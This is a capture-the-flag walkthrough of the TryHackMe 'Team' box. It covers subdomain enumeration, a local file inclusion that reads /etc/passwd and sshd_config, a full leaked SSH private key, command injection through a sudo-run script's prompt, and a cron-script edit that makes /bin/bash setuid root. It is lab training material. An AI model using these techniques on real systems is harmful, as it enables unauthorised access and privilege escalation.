# Team
## Easy
 Beginner friendly boot2root machine

## Task
Hey all this is my first box! It is aimed at beginners as I often see boxes that are "easy" but are often a bit harder!

Please allow 3-5 minutes for the box to boot

Edit 06/03/21- Just to clarify there is several ways to root this machine. One is unintended but it is just another opportunity to learn :)

`Created by:﻿dalemazza `

`Credit to P41ntP4rr0t for help along the way`

## Information Gatherings
```bash
 nmap -sC -sV 10.201.20.215 -oN nmap_team
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-15 09:22 WIB
Nmap scan report for 10.201.20.215
Host is up (0.29s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 96:a9:7c:aa:61:b3:2e:79:32:6d:ba:a5:81:f8:09:24 (RSA)
|   256 df:cd:4a:67:c4:36:b2:e9:48:86:52:3c:6d:88:87:8a (ECDSA)
|_  256 66:f6:ca:83:58:5c:1a:c0:99:45:a5:4e:8a:e1:8f:e1 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works! If you see this add 'te...
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                      
Nmap done: 1 IP address (1 host up) scanned in 43.62 seconds  ```
```
## Enumerations
`80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works! If you see this add 'te...`
+ Check in tab webpage and show full note `if you see this add "team.thm" to your hosts!`

So like this

```bash
sudo vim /etc/hosts
```
Add IP address and team.thm

Open in yotu browser `http://team.thm/` to show page
```bash
gobuster dir -u http://team.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://team.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 305] [--> http://team.thm/images/]
/scripts              (Status: 301) [Size: 306] [--> http://team.thm/scripts/]
/assets               (Status: 301) [Size: 305] [--> http://team.thm/assets/]
```
Uasing FFUF like this
```bash
ffuf -u http://10.201.20.215 -H "Host: FUZZ.team.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 11366

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.201.20.215
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.team.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 11366
________________________________________________

www                     [Status: 200, Size: 2966, Words: 140, Lines: 90, Duration: 287ms]
dev                     [Status: 200, Size: 187, Words: 20, Lines: 10, Duration: 288ms]
www.dev                 [Status: 200, Size: 187, Words: 20, Lines: 10, Duration: 271ms]
```

Go to 
```
sudo vim /etc/hosts
```

And add `www.team.thm dev.team.thm team.thm` in IP address and team.thm 

Next check in browser and read note

After that edit url browser like this `http://dev.team.thm/script.php?page=/etc/passwd`
```bash

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
dale:x:1000:1000:anon,,,:/home/dale:/bin/bash
gyles:x:1001:1001::/home/gyles:/bin/bash
ftpuser:x:1002:1002::/home/ftpuser:/bin/sh
ftp:x:110:116:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-timesync:x:112:117:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
tss:x:113:120:TPM software stack,,,:/var/lib/tpm:/bin/false
tcpdump:x:114:121::/nonexistent:/usr/sbin/nologin
fwupd-refresh:x:115:122:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
usbmux:x:116:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
ssm-user:x:1003:1005::/home/ssm-user:/bin/sh
ubuntu:x:1004:1007:Ubuntu:/home/ubuntu:/bin/bash
```
Found `user`
```txt
dale
gyles
```
Check in browser url like this `http://dev.team.thm/script.php?page=/etc/ssh/sshd_config`

We found
```bash
#Dale id_rsa
#-----BEGIN OPENSSH PRIVATE KEY-----
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
#-----END OPENSSH PRIVATE KEY-----
```

## Initial Access 
Make file `dale` and copy paste private key in file and enter for 1 line in file dale
```bash
chmod 600 dale
```
```bash
ssh -i dale dale@dev.team.thm

Last login: Mon Jan 18 10:51:32 2021
dale@ip-10-201-7-201:~$ 
```
```bash
dale@ip-10-201-7-201:~$ ls -la
total 44
drwxr-xr-x 6 dale dale 4096 Jan 15  2021 .
drwxr-xr-x 7 root root 4096 Jun  1 11:56 ..
-rw------- 1 dale dale 2549 Jan 21  2021 .bash_history
-rw-r--r-- 1 dale dale  220 Jan 15  2021 .bash_logout
-rw-r--r-- 1 dale dale 3771 Jan 15  2021 .bashrc
drwx------ 2 dale dale 4096 Jan 15  2021 .cache
drwx------ 3 dale dale 4096 Jan 15  2021 .gnupg
drwxrwxr-x 3 dale dale 4096 Jan 15  2021 .local
-rw-r--r-- 1 dale dale  807 Jan 15  2021 .profile
drwx------ 2 dale dale 4096 Jan 15  2021 .ssh
-rw-r--r-- 1 dale dale    0 Jan 15  2021 .sudo_as_admin_successful
-rw-rw-r-- 1 dale dale   17 Jan 15  2021 user.txt
```
`Yeyy we get user.txt!`
```
dale@ip-10-201-7-201:~$ cat user.txt
THM{**********}
```
Check `sudo -l`
```
dale@ip-10-201-7-201:~$ sudo -l
Matching Defaults entries for dale on ip-10-201-7-201:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dale may run the following commands on ip-10-201-7-201:
    (gyles) NOPASSWD: /home/gyles/admin_checks
```
## Privilege Escalation
Let's go search root
```bash
dale@ip-10-201-7-201:~$ sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: SantStyle
Enter 'date' to timestamp the file: /bin/bash -p
The Date is 
ls -la
total 44
drwxr-xr-x 6 dale dale 4096 Jan 15  2021 .
drwxr-xr-x 7 root root 4096 Jun  1 11:56 ..
-rw------- 1 dale dale 2549 Jan 21  2021 .bash_history
-rw-r--r-- 1 dale dale  220 Jan 15  2021 .bash_logout
-rw-r--r-- 1 dale dale 3771 Jan 15  2021 .bashrc
drwx------ 2 dale dale 4096 Jan 15  2021 .cache
drwx------ 3 dale dale 4096 Jan 15  2021 .gnupg
drwxrwxr-x 3 dale dale 4096 Jan 15  2021 .local
-rw-r--r-- 1 dale dale  807 Jan 15  2021 .profile
drwx------ 2 dale dale 4096 Jan 15  2021 .ssh
-rw-r--r-- 1 dale dale    0 Jan 15  2021 .sudo_as_admin_successful
-rw-rw-r-- 1 dale dale   17 Jan 15  2021 user.txt
whoami
gyles
```
Edit `/usr/local/bin/main_backup.sh` like this
```bash
gyles@ip-10-201-7-201:~$ vim /usr/local/bin/main_backup.sh
```
```bash
#!/bin/bash
chmod +s /bin/bash
cp -r /var/www/team.thm/* /var/backups/www/team.thm/
```
bash `ls -la`
```bash
gyles@ip-10-201-7-201:~$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```
After this
```bash
gyles@ip-10-201-7-201:~$ /bin/bash -p
bash-5.0# cd /root
bash-5.0# ls -la
total 68
drwx------  7 root root  4096 Jun  1 19:27 .
drwxr-xr-x 23 root root  4096 Sep 15 04:24 ..
-rw-------  1 root root  7813 Jun  1 12:28 .bash_history
-rw-r--r--  1 root root  3106 Apr  9  2018 .bashrc
drwx------  2 root root  4096 Jan 15  2021 .cache
drwx------  4 root root  4096 Jan 15  2021 .gnupg
drwxr-xr-x  3 root root  4096 Jan 15  2021 .local
-rw-r--r--  1 root root   161 Jan  2  2024 .profile
-rw-r--r--  1 root root    18 Jan 15  2021 root.txt
-rw-r--r--  1 root root    66 Jan 17  2021 .selected_editor
drwx------  3 root root  4096 Apr 26 09:24 snap
drwx------  2 root root  4096 May 31 16:59 .ssh
-rw-r--r--  1 root root     0 Jan 16  2021 .sudo_as_admin_successful
-rw-------  1 root root 10346 Jun  1 19:27 .viminfo
-rw-r--r--  1 root root   215 Jan 17  2021 .wget-hsts
```
`Finally we get root.txt!`
```bash

bash-5.0# cat root.txt
THM{**********}
bash-5.0# 
```